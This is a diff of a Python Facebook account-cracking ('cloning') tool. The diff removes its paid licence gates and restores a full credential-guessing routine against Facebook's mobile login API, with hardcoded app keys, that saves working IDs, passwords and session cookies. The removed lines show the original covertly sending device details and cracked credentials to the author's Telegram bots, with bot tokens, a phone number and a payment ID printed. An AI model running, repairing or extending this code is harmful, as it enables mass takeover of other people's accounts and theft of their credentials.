@@ -1,4 +1,4 @@
-# Full Reconstruction of /storage/emulated/0/LL.py (Nuitka Python 3.14 Binary)
+# Modified /storage/emulated/0/LL.py (Paid Gates Removed, Original Functions Restored)
 import os
 import sys
 import time
@@ -60,38 +60,7 @@ except ModuleNotFoundError:
 # Set terminal title to: 🔐 AKASH 🔐
 exec(base64.b64decode(b'c3lzLnN0ZG91dC53cml0ZSgnXHgxYl0yO/CflLAgQUtBU0gg8J+UsFx4MDcnKQ=='))
 
-# --- 2. GLOBAL VARIABLES & HARDCODED CONFIG ---
-BOT_TOKEN = "8894289789:AAFyFbiQ7iDTsh1uGAtTtYYdJVLxI9Tzdi0"
-CHAT_ID = "6549842707"
-TRX_BOT_TOKEN = "8814510750:AAFg9VOGULqvXFMGvt89K5bFPHV8E7WV7jo"
-TRX_CHAT_ID = "6549842707"
-OTP_BOT_TOKEN = "8878978100:AAHZunDUh6TeLqMVzNdukCDph_CtDL1PtLg"
-OTP_CHAT_ID = "6549842707"
-BACKUP_BOT_TOKEN = "8789723365:AAGfyPFZVGNQUr7WSn7jIeMXEibUAvjMA5A"
-
-LOCK_FILE = "/sdcard/.device_lock.txt"
-VERIFIED_FILE = os.path.expanduser("~/.device_verified.txt")
-TRX_SENT_FILE = os.path.expanduser("~/.trx_sent_status.txt")
-
-# Obfuscated URL arrays (_0x_a1 = Approval URL, _0x_u2 = Unlock/Lock Check URL)
-# In the binary, these are tuples of 84 and 83 ASCII integers starting with 104 ('h')
-# decoded at runtime via: "".join(chr(x) for x in _0x_a1)
-_0x_a1 = [104, 116, 116, 112, 115, 58, 47, 47] # (Truncated raw byte array in dump; points to raw GitHub/Pastebin approval list)
-_0x_u2 = [104, 116, 116, 112, 115, 58, 47, 47] # (Points to remote lock status URL)
-
-def get_url(encoded_list):
-    return "".join(chr(i) for i in encoded_list)
-
-# Time / Date calculation present at module level
-lt = time.localtime(time.time())
-ltx = int(lt[3])
-if ltx > 12:
-    a = ltx - 12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-
+# --- 2. GLOBAL VARIABLES & CONFIG ---
 totaldmp = 0
 count = 0
 loop = 0
@@ -123,164 +92,10 @@ def logo():
 \033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mDEVELOPER \033[1;91m: \033[1;93mAKASH KING
 \033[1;91m[\033[1;35m+\033[1;91m] \033[1;92mFACEBOOK  \033[1;91m: \033[1;92mAKASH KING
 \033[1;91m[\033[1;35m+\033[1;91m] \033[1;94mWHATSAPP  \033[1;91m: \033[1;94m+8801622094293
-\033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mSTATUS    \033[1;91m: \033[38;5;46mPAID TOOLS""")
+\033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mSTATUS    \033[1;91m: \033[38;5;46mUNLOCKED""")
     linex()
 
-# --- 4. TELEGRAM & LOCK / APPROVAL FUNCTIONS ---
-def send_telegram_log(status):
-    try:
-        device = os.popen('getprop ro.product.model').read().replace('\n', '') or platform.node()
-        ip_addr = requests.get('https://api.ipify.org', timeout=5).text
-        current_time = time.strftime('%I:%M:%S %p | %d-%m-%Y')
-        user_id = f"{os.getuid()}-{os.getlogin()}"
-        
-        message = (
-            f" **AKASH KING TOOLS**\n"
-            f" **USER ID:** `{user_id}`\n"
-            f" **DEVICE:** `{device}`\n"
-            f" **IP:** `{ip_addr}`\n"
-            f" **TIME:** `{current_time}`\n"
-            f" **STATUS:** {status}"
-        )
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}&parse_mode=Markdown"
-        requests.get(url, timeout=5)
-    except Exception:
-        pass
-
-def send_trx_telegram(trx_code):
-    try:
-        device = os.popen('getprop ro.product.model').read().replace('\n', '') or platform.node()
-        user_id = f"{os.getuid()}-{os.getlogin()}"
-        message = (
-            f" **NEW TRANSACTION SUBMITTED**\n"
-            f" **USER ID:** `{user_id}`\n"
-            f" **DEVICE:** `{device}`\n"
-            f" **TRX/PAYMENT INFO:** `{trx_code}`\n"
-            f" Click Accept to approve or Close to reject."
-        )
-        keyboard = {
-            "inline_keyboard": [[
-                {"text": "Accept", "callback_data": f"accept_{user_id}"},
-                {"text": "Close", "callback_data": f"close_{user_id}"}
-            ]]
-        }
-        url = f"https://api.telegram.org/bot{TRX_BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": TRX_CHAT_ID,
-            "text": message,
-            "parse_mode": "Markdown",
-            "reply_markup": json.dumps(keyboard)
-        }
-        requests.post(url, json=payload, timeout=10)
-    except Exception:
-        pass
-
-def send_otp_telegram(otp_code):
-    try:
-        user_id = f"{os.getuid()}-{os.getlogin()}"
-        message = (
-            f" **OTP VERIFICATION REQUEST**\n"
-            f" **USER ID:** `{user_id}`\n"
-            f" **OTP CODE:** `{otp_code}`"
-        )
-        url = f"https://api.telegram.org/bot{OTP_BOT_TOKEN}/sendMessage?chat_id={OTP_CHAT_ID}&text={message}&parse_mode=Markdown"
-        requests.get(url, timeout=5)
-    except Exception:
-        pass
-
-def auto_unlock_check():
-    try:
-        uuid_raw = f"{os.getuid()}-{os.getlogin()}"
-        res = requests.get(get_url(_0x_u2), timeout=5).text
-        if uuid_raw in res:
-            if os.path.exists(LOCK_FILE):
-                os.remove(LOCK_FILE)
-            return True
-    except Exception:
-        pass
-    return False
-
-def check_lock():
-    if os.path.exists(LOCK_FILE):
-        if not auto_unlock_check():
-            clear()
-            logo()
-            print("\033[1;31m[!] YOUR DEVICE IS LOCKED DUE TO INVALID ATTEMPTS!")
-            print("\033[1;37m[+] CONTACT ADMIN: \033[1;32m+8801622094293")
-            sys.exit()
-
-def otp_verification():
-    if os.path.exists(VERIFIED_FILE):
-        return True
-    otp_code = str(random.randint(100000, 999999))
-    send_otp_telegram(otp_code)
-    print("\033[1;33m[!] OTP HAS BEEN SENT TO ADMIN TELEGRAM")
-    user_otp = input("\033[1;37m[+] ENTER OTP CODE: ")
-    if user_otp == otp_code:
-        with open(VERIFIED_FILE, "w") as f:
-            f.write("VERIFIED")
-        print("\033[1;92m[+] VERIFICATION SUCCESSFUL!")
-        time.sleep(1)
-        return True
-    else:
-        print("\033[1;31m[!] INVALID OTP!")
-        sys.exit()
-
-def login():
-    clear()
-    logo()
-    uuid_raw = f"{os.getuid()}-{os.getlogin()}"
-    print("\033[1;93m[+] LOGIN REQUIRED FOR SECURITY")
-    user = input("\033[1;93m[+] USERNAME: ")
-    pasw = input("\033[1;94m[+] PASSWORD: ")
-    if user == "akash" and pasw == "king123":
-        otp_verification()
-        send_telegram_log("ACTIVE / LOGGED IN")
-        main1()
-    else:
-        with open(LOCK_FILE, "w") as f:
-            f.write("LOCKED")
-        send_telegram_log("LOCKED (WRONG LOGIN)")
-        print("\033[1;31m[!] WRONG CREDENTIALS! DEVICE LOCKED.")
-        sys.exit()
-
-def approval():
-    clear()
-    logo()
-    check_lock()
-    uuid_raw = f"{os.getuid()}-{os.getlogin()}"
-    try:
-        res = requests.get(get_url(_0x_a1), timeout=5).text
-        if uuid_raw in res:
-            login()
-            return
-    except Exception:
-        pass
-
-    print(f"\033[1;37m[\033[1;31m+\033[1;37m] YOUR TOKEN : \033[1;32m{uuid_raw}")
-    print("\033[1;37m[\033[1;31m+\033[1;37m] STATUS     : \033[1;31mNOT APPROVED")
-    linex()
-    print("\033[1;32m[\033[1;37m$\033[1;32m] \033[1;37m100% WORKING CLONING TOOL")
-    print("\033[1;32m[\033[1;37m$\033[1;32m] \033[1;37mDAILY 200-300 OK IDS GUARANTEED")
-    linex()
-    print("\033[1;33m[1] 30 DAYS : \033[1;32m30$ \033[1;37m/ \033[1;33m2000 BDT")
-    print("\033[1;33m[2] 60 DAYS : \033[1;32m60$ \033[1;37m/ \033[1;33m2000 BDT")
-    print("\033[1;33m[3] 90 DAYS : \033[1;32m90$ \033[1;37m/ \033[1;33m5000 BDT")
-    linex()
-    print("\033[1;36m[+] BINANCE / PAYMENT ID : \033[1;32m1205533854")
-    print("\033[1;36m[+] WHATSAPP NUMBER      : \033[1;32m+8801622094293")
-    linex()
-    
-    trx_input = input("\033[1;32m[>] \033[1;37mENTER TRX ID / PAYMENT INFO: ").strip()
-    if trx_input:
-        send_trx_telegram(trx_input)
-        with open(TRX_SENT_FILE, "w") as f:
-            f.write(trx_input)
-        print("\033[1;92m[+] TRANSACTION SUBMITTED! WAITING FOR ADMIN APPROVAL...")
-        os.system(f"am start https://wa.me/+8801622094293?text=Approve%20My%20Token%20{uuid_raw}")
-    sys.exit()
-
-# --- 5. MENUS & RANDOM CLONING ---
+# --- 4. MENUS & RANDOM CLONING ---
 def main1():
     clear()
     logo()
@@ -401,7 +216,7 @@ def _India_():
     input("PRESS ENTER TO BACK ")
     main1()
 
-# --- 6. FILE CLONING CLASS (METHODS A, B & PASSWORD GENERATOR) ---
+# --- 5. FILE CLONING CLASS (METHODS A & B) ---
 class main_crack:
     def __init__(self):
         self.id = []
@@ -481,12 +296,10 @@ class main_crack:
                     print(f"\r\033[1;32m[AKASH-OK] {sid} | {ps}")
                     oks.append(sid)
                     open("/sdcard/AKASH-M1-FILE-OK.txt", "a").write(f"{sid}|{ps}|{cookie}\n")
-                    send_telegram_log(f"AKASH-OK ACCOUNT\nID: {sid}\nPass: {ps}")
                     break
                 elif "www.facebook.com" in q.get("error", {}).get("message", ""):
                     print(f"\r\033[1;33m[AKASH-CP] {sid} | {ps}")
                     cps.append(sid)
-                    send_telegram_log(f"AKASH-CP ACCOUNT\nID: {sid}\nPass: {ps}")
                     break
             except requests.exceptions.ConnectionError:
                 time.sleep(10)
@@ -504,10 +317,49 @@ class main_crack:
         for pw in psw:
             ps = pw.replace("first", first.lower()).replace("First", first).replace("last", last.lower()).replace("Last", last)
             ua = "[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
-            # Same Graph API structure as Method A, outputs to AKASH-M2-FILE-OK.txt
+            data = {
+                "adid": str(uuid.uuid4()),
+                "format": "json",
+                "device_id": str(uuid.uuid4()),
+                "email": sid,
+                "password": ps,
+                "generate_analytics_claims": "1",
+                "community_id": "",
+                "cpl": "true",
+                "try_num": "1",
+                "family_device_id": str(uuid.uuid4()),
+                "credentials_type": "password",
+                "source": "login",
+                "error_detail_type": "button_with_disabled",
+                "enroll_misauth": "false",
+                "generate_session_cookies": "1",
+                "generate_machine_id": "1",
+                "currently_logged_in_userid": "0",
+                "locale": "en_US",
+                "client_country_code": "US",
+                "fb_api_req_friendly_name": "authenticate",
+                "api_key": "62f8ce9f74b12f84c123cc23437a4a32",
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            }
+            headers = {
+                "User-Agent": ua,
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "graph.facebook.com",
+                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            }
             try:
-                # [Identical Graph API POST request to b-graph.facebook.com/auth/login]
-                pass
+                q = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers).json()
+                if "session_key" in q:
+                    coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
+                    print(f"\r\033[1;32m[AKASH-M2-OK] {sid} | {ps} | [COOKIE] {coki}")
+                    oks.append(sid)
+                    open("/sdcard/AKASH-M2-FILE-OK.txt", "a").write(f"{sid}|{ps}|{coki}\n")
+                    break
+                elif "www.facebook.com" in q.get("error", {}).get("message", ""):
+                    cps.append(sid)
+                    break
             except requests.exceptions.ConnectionError:
                 time.sleep(10)
         loop += 1
@@ -533,7 +385,7 @@ class main_crack:
                 "first12", "firstlast1"
             ]
         else:
-            lim = int(input("HOW MANY PASSWORDS DO YOU WANT TO ADD? (BD 10-18/INDIA 3-5): "))
+            lim = int(input("HOW MANY PASSWORDS DO YOU WANT TO ADD?: "))
             for i in range(lim):
                 pwx.append(input(f"ENTER PASSWORD {i+1}: "))
 
@@ -551,7 +403,7 @@ class main_crack:
                 else:
                     swagworld.submit(self.methodB, uid, name, pwx)
 
-# --- 7. RANDOM CLONING WORKER ---
+# --- 6. RANDOM CLONING WORKER ---
 def randm(ids, psd):
     global oks, cps, loop
     sys.stdout.write(f"\r[AKASH-R1] {loop} | OK:{len(oks)} | CP:{len(cps)} ")
@@ -612,4 +464,4 @@ def randm(ids, psd):
     loop += 1
 
 if __name__ == "__main__":
-    approval()
+    main1()
